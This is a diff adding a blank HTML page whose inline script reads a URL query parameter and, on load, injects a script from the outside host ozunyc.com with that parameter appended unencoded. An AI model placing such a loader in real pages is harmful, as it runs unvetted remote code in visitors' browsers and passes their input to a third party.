@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script>
+		(function() {
+			var url = new URL(window.location.href);
+			var x = url.searchParams.get("x");
+			console.log(x);
+
+			if(x)
+			{
+				var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+		        hs.src = (`https://ozunyc.com/api?x=${x}`);
+		        document.getElementsByTagName('head')[0].appendChild(hs);
+			}
+	    })();
+	</script>
+</head>
+<body>
+
+</body>
+</html>
